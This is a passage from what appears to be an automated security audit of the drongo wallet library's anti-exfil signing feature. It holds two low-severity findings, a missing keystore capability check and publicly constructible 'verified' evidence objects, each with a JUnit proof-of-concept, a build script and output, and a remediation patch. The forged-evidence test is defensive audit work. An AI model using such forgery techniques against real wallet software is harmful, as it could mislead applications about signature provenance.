A keystore defaults to `AntiExfilKeystorePolicy.UNSUPPORTED`, and the policy explicitly exposes whether anti-exfil is supported. The new public slot-enumeration and coordinator-creation entry points check only account xpub/derivation material and never call `supportsAntiExfil`. A default unsupported keystore can consequently create a durable host-commit session and, when supplied protocol vectors, drive the ceremony through completion. A genuinely incompatible signer will instead stall after session creation because it cannot provide valid openings or signatures. Completion remains cryptographically checked, so no ordinary signature is misrepresented as protected.
## Root cause

The anti-exfil entry points omit the existing keystore capability policy and infer support solely from generic public account-key material.
## Impact

Applications relying on the new entry points to enforce device capability can enter and persist a signing flow that the configured signer explicitly does not support. This creates a reversible signing-availability and policy-enforcement failure, requiring abandonment or fallback handling.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.protocol.Sha256Hash;
import com.sparrowwallet.drongo.wallet.AntiExfilKeystorePolicy;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");

    @TempDir
    Path temporary;

    @Test
    void unsupportedDefaultKeystoreStillCreatesPersistentAntiExfilCeremonyAndCompletesWithValidProtocolPeer() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        byte[] expectedCommit = Utils.hexToBytes(field(vector, "message_1_hex"));
        byte[] signatures = Utils.hexToBytes(field(vector, "message_4_hex"));
        Keystore unsupported = keystore();
        assertEquals(AntiExfilKeystorePolicy.UNSUPPORTED, unsupported.getAntiExfilPolicy());
        assertFalse(unsupported.supportsAntiExfil());

        List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(original, unsupported);
        assertFalse(slots.isEmpty(), "Unsupported policy is ignored during authoritative slot enumeration");

        Path publicSession = temporary.resolve("public-entrypoint.aexs");
        Path publicJournal = temporary.resolve("public-entrypoint.aexj");
        AntiExfilCoordinator publicCoordinator = AntiExfilCoordinator.create(publicSession, publicJournal, original,
                unsupported, AntiExfilNetwork.TESTNET4);
        assertTrue(Files.exists(publicSession), "Public create persisted a live ceremony for an unsupported keystore");
        assertEquals(AntiExfilCoordinator.Phase.COMMITMENTS_CREATED, publicCoordinator.getStatus().getPhase());
        assertArrayEquals(original, publicCoordinator.getFrozenPsbt());

        AntiExfilMessage finalMessage = AntiExfilCodec.decode(signatures);
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : finalMessage.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, null));
        }
        byte[] openings = AntiExfilCodec.encode(new AntiExfilMessage(finalMessage.getNetwork(),
                AntiExfilStage.SIGNER_OPENINGS, finalMessage.getSessionId(), finalMessage.getPsbtDigest(), openingSlots));

        Path deterministicSession = temporary.resolve("vector-compatible.aexs");
        Path deterministicJournal = temporary.resolve("vector-compatible.aexj");
        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(deterministicSession, deterministicJournal,
                original, unsupported, AntiExfilNetwork.TESTNET4, false, new VectorRandom());
        assertArrayEquals(expectedCommit, coordinator.getHostCommitMessage());

        byte[] reveal = coordinator.acceptOpenings(openings);
        AntiExfilMessage revealMessage = AntiExfilCodec.decode(reveal);
        assertEquals(AntiExfilStage.HOST_REVEAL, revealMessage.getStage());
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(expectedCommit), AntiExfilCodec.decode(openings));
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(openings), revealMessage);

        AntiExfilCoordinator.Completion completion = coordinator.complete(signatures);
        assertEquals(field(vector, "signed_psbt_sha256"), Utils.bytesToHex(Sha256Hash.hash(completion.getSignedPsbt())));
        assertEquals(slots.size(), completion.getVerifiedSignatures().size());

        AntiExfilCoordinator reloaded = AntiExfilCoordinator.load(deterministicSession, deterministicJournal, unsupported);
        assertEquals(AntiExfilCoordinator.Phase.COMPLETE, reloaded.getStatus().getPhase());
        assertFalse(reloaded.getCompletedResult().getVerifiedSignatures().isEmpty());
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }

    private static final class VectorRandom extends SecureRandom {
        private int call;

        @Override
        public void nextBytes(byte[] bytes) {
            Arrays.fill(bytes, call++ == 0 ? (byte)'z' : (byte)(0x7f + call - 1));
        }
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 11 lines & 0.732421875 KB skipped]
> Task :processResources
> Task :classes
> Task :compileTestJava
> Task :processTestResources
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 10s
5 actionable tasks: 5 executed
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC passed with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'`; JUnit XML confirms 1 test, 0 failures/errors/skips. The test exercises the public `AntiExfilPsbt.enumerateSigningSlots(...)` and public `AntiExfilCoordinator.create(...)` to show a default `UNSUPPORTED` keystore is accepted and persists a `COMMITMENTS_CREATED` ceremony. To demonstrate completion with fixed protocol vectors, it uses the package-private deterministic `AntiExfilCoordinator.create(..., SecureRandom)` test-visible overload so message 1 matches the existing vector; `acceptOpenings(...)`, `complete(...)`, `load(...)`, and result inspection are real coordinator paths. It does not model a genuinely incapable hardware signer; instead it proves the API cannot distinguish unsupported from supported keystore policy when the peer can supply valid protocol messages.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Gate authoritative anti-exfil slot enumeration on the keystore's existing capability policy, which also prevents coordinator creation and all downstream anti-exfil operations from accepting UNSUPPORTED keystores.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java
@@ -1,254 +1,257 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.KeyDerivation;
 import com.sparrowwallet.drongo.crypto.ECDSASignature;
 import com.sparrowwallet.drongo.crypto.ECKey;
 import com.sparrowwallet.drongo.protocol.Script;
 import com.sparrowwallet.drongo.protocol.ScriptChunk;
 import com.sparrowwallet.drongo.protocol.ScriptOpCodes;
 import com.sparrowwallet.drongo.protocol.ScriptType;
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 import com.sparrowwallet.drongo.protocol.SigHash;
 import com.sparrowwallet.drongo.protocol.TransactionSignature;
 import com.sparrowwallet.drongo.psbt.PSBT;
 import com.sparrowwallet.drongo.psbt.PSBTInput;
 import com.sparrowwallet.drongo.psbt.PSBTParseException;
 import com.sparrowwallet.drongo.wallet.Keystore;
 
 import java.math.BigInteger;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashSet;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilPsbt {
     private AntiExfilPsbt() {
     }
 
     public static PSBT parseCanonicalV0(byte[] raw) {
         if(raw == null || raw.length < 5 || raw[0] != 'p' || raw[1] != 's' || raw[2] != 'b' || raw[3] != 't' || raw[4] != (byte)0xff) {
             throw fail(INVALID_MESSAGE, "Invalid PSBT magic");
         }
         try {
             PSBT psbt = new PSBT(raw, false);
             if(psbt.getVersion() != null && psbt.getVersion() != 0) {
                 throw fail(INVALID_MESSAGE, "Protocol v1 accepts PSBT v0 only");
             }
             if(!Arrays.equals(raw, psbt.serialize())) {
                 throw fail(INVALID_MESSAGE, "PSBT is not canonically encoded");
             }
             if(psbt.getTransaction() == null || psbt.getPsbtInputs().isEmpty() || psbt.getPsbtOutputs().isEmpty()) {
                 throw fail(INVALID_MESSAGE, "PSBT requires an unsigned transaction");
             }
             return psbt;
         } catch(PSBTParseException | RuntimeException e) {
             if(e instanceof AntiExfilException antiExfilException) throw antiExfilException;
             throw new AntiExfilException(INVALID_MESSAGE, "Invalid PSBT: " + e.getMessage(), e);
         }
     }
 
     public static List<AntiExfilSigningSlot> enumerateSigningSlots(byte[] raw, Keystore keystore) {
         if(keystore == null || keystore.getKeyDerivation() == null || keystore.getExtendedPublicKey() == null) {
             throw fail(INVALID_MESSAGE, "A public account keystore is required");
         }
+        if(!keystore.supportsAntiExfil()) {
+            throw fail(INVALID_MESSAGE, "Keystore does not support anti-exfil");
+        }
         PSBT psbt = parseCanonicalV0(raw);
         List<AntiExfilSigningSlot> slots = new ArrayList<>();
         for(int index = 0; index < psbt.getPsbtInputs().size(); index++) {
             PSBTInput input = psbt.getPsbtInputs().get(index);
             failOnTaproot(index, input);
             if(input.getUtxo() == null) failInput(index, "missing UTXO data");
             ScriptClassification classification = classify(index, input);
             SigHash sigHash = input.getSigHash() == null ? SigHash.ALL : input.getSigHash();
             if(sigHash != SigHash.ALL) failInput(index, "protocol v1 supports only explicit SIGHASH_ALL");
             validateDerivations(index, input, classification.signingKeys());
             byte[] messageHash;
             try {
                 messageHash = input.getSigningHash().getBytes();
             } catch(RuntimeException e) {
                 throw new AntiExfilException(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": cannot derive sighash", e);
             }
             for(Map.Entry<ECKey, KeyDerivation> entry : input.getDerivedPublicKeys().entrySet()) {
                 ECKey publicKey = entry.getKey();
                 KeyDerivation derivation = entry.getValue();
                 if(!classification.signingKeys().contains(publicKey)
                         || !keystore.getKeyDerivation().getMasterFingerprint().equals(derivation.getMasterFingerprint())) continue;
                 ECKey expected = keystore.getPubKeyForDerivation(derivation);
                 if(expected == null || !Arrays.equals(expected.getPubKey(), publicKey.getPubKey())) {
                     failInput(index, "BIP32 path does not derive its declared public key");
                 }
                 if(input.getPartialSignatures().containsKey(publicKey)) {
                     throw fail(UNEXPECTED_RETURN_DATA, "Input " + index + " already has a controlled signature");
                 }
                 if(input.isFinalized()) continue;
                 slots.add(new AntiExfilSigningSlot(index, publicKey.getPubKey(), messageHash,
                         AntiExfilCodec.SIGHASH_ALL, derivation, classification.kind()));
             }
         }
         slots.sort((left, right) -> left.getIdentifier().compareTo(right.getIdentifier()));
         if(slots.isEmpty()) throw fail(SIGNATURE_SLOT_MISMATCH, "PSBT has no controlled signing slots");
         if(slots.size() > AntiExfilCodec.MAX_SLOTS) throw fail(SIGNATURE_SLOT_MISMATCH, "PSBT exceeds the global slot limit");
         Set<AntiExfilSigningSlot.Identifier> identifiers = new HashSet<>();
         Map<Integer, Integer> perInput = new LinkedHashMap<>();
         for(AntiExfilSigningSlot slot : slots) {
             if(!identifiers.add(slot.getIdentifier())) throw fail(SIGNATURE_SLOT_MISMATCH, "Duplicate signing slot");
             int count = perInput.merge(slot.getInputIndex(), 1, Integer::sum);
             if(count > AntiExfilCodec.MAX_SLOTS_PER_INPUT) failInput(slot.getInputIndex(), "input exceeds the per-input slot limit");
         }
         return List.copyOf(slots);
     }
 
     public static AntiExfilMessage buildHostCommitMessage(byte[] raw, Keystore keystore, AntiExfilNetwork network,
                                                            byte[] sessionId,
                                                            Map<AntiExfilSigningSlot.Identifier, byte[]> hostRandomness) {
         List<AntiExfilSigningSlot> semantic = enumerateSigningSlots(raw, keystore);
         Set<AntiExfilSigningSlot.Identifier> expected = new HashSet<>();
         semantic.forEach(slot -> expected.add(slot.getIdentifier()));
         if(hostRandomness == null || !hostRandomness.keySet().equals(expected)) {
             throw fail(SIGNATURE_SLOT_MISMATCH, "Host randomness must cover the exact slot set");
         }
         Set<ByteArray> uniqueRandomness = new HashSet<>();
         List<AntiExfilSlot> records = new ArrayList<>();
         for(AntiExfilSigningSlot slot : semantic) {
             byte[] rho = hostRandomness.get(slot.getIdentifier());
             if(rho == null || rho.length != 32 || !uniqueRandomness.add(new ByteArray(rho))) {
                 throw fail(COMMITMENT_MISMATCH, "Host randomness must be valid and unique per slot");
             }
             records.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                     slot.getMessageHash(), AntiExfilCrypto.hostCommit(rho), null, null, null));
         }
         AntiExfilMessage message = new AntiExfilMessage(network, AntiExfilStage.HOST_COMMIT, sessionId, Sha256Hash.hash(raw), records);
         AntiExfilCodec.validate(message);
         return message;
     }
 
     public static byte[] reconstructSignedPsbt(byte[] original, Keystore keystore, AntiExfilMessage commit,
                                                AntiExfilMessage signatures,
                                                Map<AntiExfilSigningSlot.Identifier, byte[]> hostRandomness) {
         List<AntiExfilSigningSlot> semantic = enumerateSigningSlots(original, keystore);
         Set<AntiExfilSigningSlot.Identifier> expectedIdentifiers = new HashSet<>();
         semantic.forEach(slot -> expectedIdentifiers.add(slot.getIdentifier()));
         if(hostRandomness == null || !hostRandomness.keySet().equals(expectedIdentifiers)) {
             throw fail(SIGNATURE_SLOT_MISMATCH, "Stored host randomness differs from the authoritative slot set");
         }
         AntiExfilCodec.validate(commit);
         AntiExfilCodec.validate(signatures);
         if(commit == null || commit.getStage() != AntiExfilStage.HOST_COMMIT
                 || !Arrays.equals(commit.getPsbtDigest(), Sha256Hash.hash(original))
                 || commit.getSlots().size() != semantic.size()) {
             throw fail(TRANSACTION_MISMATCH, "Commit message is not authoritative for the PSBT");
         }
         if(signatures == null || signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) {
             throw fail(WRONG_STAGE, "Expected signer-signatures message");
         }
         if(signatures.getNetwork() != commit.getNetwork()
                 || !Arrays.equals(signatures.getSessionId(), commit.getSessionId())
                 || !Arrays.equals(signatures.getPsbtDigest(), commit.getPsbtDigest())
                 || signatures.getSlots().size() != semantic.size()) {
             throw fail(TRANSACTION_MISMATCH, "Signature response context changed");
         }
         PSBT reconstructed = parseCanonicalV0(original);
         for(int i = 0; i < semantic.size(); i++) {
             AntiExfilSigningSlot authoritative = semantic.get(i);
             AntiExfilSlot before = commit.getSlots().get(i);
             AntiExfilSlot after = signatures.getSlots().get(i);
             byte[] rho = hostRandomness == null ? null : hostRandomness.get(authoritative.getIdentifier());
             requireSlot(authoritative, before);
             requireSlot(authoritative, after);
             if(!Arrays.equals(before.getCommitment(), after.getCommitment()) || rho == null
                     || !Arrays.equals(AntiExfilCrypto.hostCommit(rho), before.getCommitment())) {
                 throw fail(COMMITMENT_MISMATCH, "Stored randomness or response commitment changed");
             }
             if(!AntiExfilCrypto.verify(after.getSignerPublicKey(), after.getMessageHash(), rho,
                     after.getOpening(), after.getSignature())) {
                 throw fail(SIGNATURE_INVALID, "Anti-exfil signature verification failed");
             }
             byte[] compact = after.getSignature();
             BigInteger r = new BigInteger(1, Arrays.copyOfRange(compact, 0, 32));
             BigInteger s = new BigInteger(1, Arrays.copyOfRange(compact, 32, 64));
             TransactionSignature signature = new TransactionSignature(new ECDSASignature(r, s), SigHash.ALL);
             reconstructed.getPsbtInputs().get(authoritative.getInputIndex()).getPartialSignatures()
                     .put(ECKey.fromPublicOnly(authoritative.getSignerPublicKey()), signature);
         }
         return reconstructed.serialize();
     }
 
     private static void requireSlot(AntiExfilSigningSlot authoritative, AntiExfilSlot record) {
         if(record.getInputIndex() != Integer.toUnsignedLong(authoritative.getInputIndex())
                 || record.getSighashType() != AntiExfilCodec.SIGHASH_ALL
                 || !Arrays.equals(record.getSignerPublicKey(), authoritative.getSignerPublicKey())
                 || !Arrays.equals(record.getMessageHash(), authoritative.getMessageHash())) {
             throw fail(SIGNATURE_SLOT_MISMATCH, "Protocol slot differs from authoritative PSBT semantics");
         }
     }
 
     private static ScriptClassification classify(int index, PSBTInput input) {
         ScriptType type = input.getScriptType();
         if(type == ScriptType.P2WPKH || type == ScriptType.P2SH_P2WPKH) {
             Script program = type == ScriptType.P2WPKH ? input.getUtxo().getScript() : input.getRedeemScript();
             if(program == null || !ScriptType.P2WPKH.isScriptType(program)) failInput(index, "inconsistent P2WPKH script");
             List<ECKey> matches = input.getDerivedPublicKeys().keySet().stream()
                     .filter(key -> ScriptType.P2WPKH.getOutputScript(key.getPubKeyHash()).equals(program)).toList();
             if(matches.size() != 1) failInput(index, "P2WPKH requires exactly one matching BIP32 public key");
             return new ScriptClassification(type == ScriptType.P2WPKH ? "p2wpkh" : "p2sh-p2wpkh", Set.copyOf(matches));
         }
         if(type == ScriptType.P2WSH || type == ScriptType.P2SH_P2WSH) {
             Script witnessScript = input.getWitnessScript();
             if(witnessScript == null || !ScriptType.MULTISIG.isScriptType(witnessScript)) failInput(index, "witness script is not standard multisig");
             List<ScriptChunk> chunks = witnessScript.getChunks();
             if(!chunks.getLast().equalsOpCode(ScriptOpCodes.OP_CHECKMULTISIG)) failInput(index, "witness script must end in CHECKMULTISIG");
             ECKey[] keys;
             try {
                 keys = ScriptType.MULTISIG.getPublicKeysFromScript(witnessScript);
                 if(ScriptType.MULTISIG.getThreshold(witnessScript) > keys.length) failInput(index, "multisig threshold exceeds key count");
                 for(int i = 1; i < chunks.size() - 2; i++) {
                     if(chunks.get(i).getOpcode() != 33 || chunks.get(i).getData() == null || chunks.get(i).getData().length != 33) {
                         failInput(index, "multisig keys must use canonical compressed pushes");
                     }
                 }
             } catch(RuntimeException e) {
                 throw new AntiExfilException(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": invalid multisig script", e);
             }
             Set<ECKey> unique = new HashSet<>(Arrays.asList(keys));
             if(unique.size() != keys.length) failInput(index, "multisig public keys must be unique");
             String kind = type == ScriptType.P2WSH ? "p2wsh-multisig" : "p2sh-p2wsh-multisig";
             return new ScriptClassification(kind, Set.copyOf(unique));
         }
         failInput(index, "unsupported or inconsistent script type " + type);
         throw new AssertionError();
     }
 
     private static void validateDerivations(int index, PSBTInput input, Set<ECKey> signingKeys) {
         Set<ECKey> seen = new HashSet<>();
         for(Map.Entry<ECKey, KeyDerivation> entry : input.getDerivedPublicKeys().entrySet()) {
             if(!seen.add(entry.getKey()) || !signingKeys.contains(entry.getKey())
                     || entry.getValue() == null || entry.getValue().getMasterFingerprint() == null
                     || entry.getValue().getMasterFingerprint().length() != 8) {
                 failInput(index, "invalid, duplicate, or script-foreign BIP32 derivation");
             }
         }
     }
 
     private static void failOnTaproot(int index, PSBTInput input) {
         if(input.isTaproot() || input.getTapInternalKey() != null || input.getTapKeyPathSignature() != null
                 || !input.getTapDerivedPublicKeys().isEmpty()) failInput(index, "Taproot data is unsupported");
     }
 
     private static void failInput(int index, String message) {
         throw fail(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": " + message);
     }
 
     private static AntiExfilException fail(AntiExfilException.Code code, String message) {
         return new AntiExfilException(code, message);
     }
 
     private record ScriptClassification(String kind, Set<ECKey> signingKeys) {}
     private record ByteArray(byte[] value) {
         @Override public boolean equals(Object object) { return object instanceof ByteArray other && Arrays.equals(value, other.value); }
         @Override public int hashCode() { return Arrays.hashCode(value); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java`
### Validation output

```
[output truncated: 28 lines & 0.85546875 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 5s
```

---

# Verified evidence can be freely forged
**#248002**
- Severity: Low
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/VerifiedAntiExfilSignature.java` (3 locations)
#### Lines 6-10 — _The class claims successfully revalidated evidence semantics._

```
/**
 * Immutable evidence that one exact PSBT signature was produced by a
 * successfully revalidated anti-exfil ceremony.
 */
public final class VerifiedAntiExfilSignature {
```
⋯
#### Lines 21-41 — _The public constructor performs only shape checks before storing arbitrary values._

```
    public VerifiedAntiExfilSignature(byte[] sessionId, byte[] originalPsbtDigest, byte[] walletKeyIdentity,
                                      int inputIndex, byte[] outpoint, byte[] signerPublicKey, byte[] messageHash,
                                      long sighashType, byte[] compactSignature) {
        requireLength(sessionId, 32, "session ID");
        requireLength(originalPsbtDigest, 32, "original PSBT digest");
        requireLength(walletKeyIdentity, 32, "wallet-key identity");
        requireLength(outpoint, 36, "outpoint");
        requireLength(signerPublicKey, 33, "signer public key");
        requireLength(messageHash, 32, "message hash");
        requireLength(compactSignature, 64, "compact signature");
        if(inputIndex < 0) throw new IllegalArgumentException("Input index must be non-negative");
        this.sessionId = sessionId.clone();
        this.originalPsbtDigest = originalPsbtDigest.clone();
        this.walletKeyIdentity = walletKeyIdentity.clone();
        this.inputIndex = inputIndex;
        this.outpoint = outpoint.clone();
        this.signerPublicKey = signerPublicKey.clone();
        this.messageHash = messageHash.clone();
        this.sighashType = sighashType;
        this.compactSignature = compactSignature.clone();
    }
```
⋯
#### Lines 79-83 — _The validation helper enforces length only._

```
    private static void requireLength(byte[] value, int length, String name) {
        if(value == null || value.length != length) {
            throw new IllegalArgumentException("Invalid " + name);
        }
    }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
#### Lines 178-205 — _Actual cryptographic provenance is provided only by this separate construction path._

```
    private Set<VerifiedAntiExfilSignature> deriveVerifiedSignatures(State state) {
        if(state.phase != Phase.COMPLETE || state.message4 == null || state.signedPsbt == null) invalidPhase();
        AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
        AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
        List<AntiExfilSigningSlot> semantic = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
        byte[] reconstructed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                commit, signatures, state.rhos);
        if(!Arrays.equals(reconstructed, state.signedPsbt)) {
            throw fail(STATE_INVALID, "Verified-signature evidence does not reconstruct the stored signed PSBT");
        }
        PSBT original = AntiExfilPsbt.parseCanonicalV0(state.originalPsbt);
        byte[] originalDigest = Sha256Hash.hash(state.originalPsbt);
        Set<VerifiedAntiExfilSignature> verified = new LinkedHashSet<>();
        for(int i = 0; i < semantic.size(); i++) {
            AntiExfilSigningSlot authoritative = semantic.get(i);
            AntiExfilSlot signature = signatures.getSlots().get(i);
            byte[] outpoint = original.getTransaction().getInputs().get(authoritative.getInputIndex())
                    .getOutpoint().bitcoinSerialize();
            verified.add(new VerifiedAntiExfilSignature(commit.getSessionId(), originalDigest,
                    state.walletIdentity, authoritative.getInputIndex(), outpoint,
                    authoritative.getSignerPublicKey(), authoritative.getMessageHash(),
                    authoritative.getSighashType(), signature.getSignature()));
        }
        if(verified.size() != semantic.size()) {
            throw fail(STATE_INVALID, "Verified-signature evidence contains duplicate records");
        }
        return Collections.unmodifiableSet(verified);
    }
```
## Description

`VerifiedAntiExfilSignature` documents itself as evidence produced by a successfully revalidated ceremony, but its constructor is public and validates only fixed lengths and a nonnegative index. Any caller can instantiate it with an invalid compressed key, zero signature scalars, arbitrary sighash type, and unrelated context fields. The object then behaves normally in equality and hash collections and carries no MAC, coordinator signature, or other provenance marker by which a recipient can distinguish it from coordinator-minted evidence. The legitimate coordinator construction path does perform real reconstruction and cryptographic checks, but that guarantee is not enforced by the type itself. No in-repository authorization decision currently consumes caller-supplied instances, so exploitation requires a downstream library consumer to trust this public type.
## Root cause

A security-attestation type has unrestricted public construction and encodes provenance only in its name and documentation rather than in construction access or self-authenticating data.
## Impact

A downstream application that accepts these objects as the documented verification evidence can be supplied fabricated attestations without any completed ceremony or valid ECDSA signature. This can falsely satisfy provenance or UI policy decisions in consumers, though no such decision exists in this repository today.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.crypto.ECKey;
import externalattacker.ForgedEvidenceFactory;
import org.junit.jupiter.api.Test;

import java.util.LinkedHashSet;
import java.util.Set;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    @Test
    void externalCallerCanForgeVerifiedEvidenceThatDownstreamTrustGateAccepts() {
        VerifiedAntiExfilSignature forged = ForgedEvidenceFactory.forgeEvidenceWithImpossibleCryptographicMaterial();

        assertThrows(RuntimeException.class, () -> ECKey.fromPublicOnly(forged.getSignerPublicKey()).getPubKeyPoint());
        assertFalse(AntiExfilCrypto.verify(forged.getSignerPublicKey(), forged.getMessageHash(),
                new byte[32], new byte[33], forged.getCompactSignature()));

        EvidenceTrustGate downstreamConsumer = new EvidenceTrustGate();
        assertFalse(downstreamConsumer.hasSatisfiedVerifiedEvidencePolicy());

        downstreamConsumer.acceptDocumentedVerifiedEvidence(forged);

        assertTrue(downstreamConsumer.hasSatisfiedVerifiedEvidencePolicy());
        assertEquals(1, downstreamConsumer.acceptedEvidenceCount());
        assertEquals(forged, downstreamConsumer.onlyAcceptedEvidence());
        assertEquals(-1L, downstreamConsumer.onlyAcceptedEvidence().getSighashType());
    }

    private static final class EvidenceTrustGate {
        private final Set<VerifiedAntiExfilSignature> acceptedEvidence = new LinkedHashSet<>();

        void acceptDocumentedVerifiedEvidence(VerifiedAntiExfilSignature evidence) {
            acceptedEvidence.add(evidence);
        }

        boolean hasSatisfiedVerifiedEvidencePolicy() {
            return !acceptedEvidence.isEmpty();
        }

        int acceptedEvidenceCount() {
            return acceptedEvidence.size();
        }

        VerifiedAntiExfilSignature onlyAcceptedEvidence() {
            return acceptedEvidence.iterator().next();
        }
    }
}
```
### Extra files
- `src/test/java/externalattacker/ForgedEvidenceFactory.java`
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java
#   src/test/java/externalattacker/ForgedEvidenceFactory.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 10 lines & 0.6259765625 KB skipped]
> Task :processResources
> Task :classes
> Task :compileTestJava
> Task :processTestResources
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 3s
5 actionable tasks: 5 executed
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC exercises the real public VerifiedAntiExfilSignature constructor from an external test package, proves the fabricated material is not valid cryptographic evidence via ECKey/AntiExfilCrypto, and demonstrates a representative downstream trust gate accepting the forged object as documented evidence. The repository itself has no authorization/UI policy that consumes caller-supplied VerifiedAntiExfilSignature instances, so the final trust decision is modeled as an embedding application's Set-backed evidence gate rather than an in-repository production decision. Verified with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'` (5 tasks executed, build successful).
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Direct public construction now always rejects while remaining source-compatible, and a package-private factory used only by the coordinator creates evidence after the existing transcript reconstruction and cryptographic revalidation.
### Patch

```diff
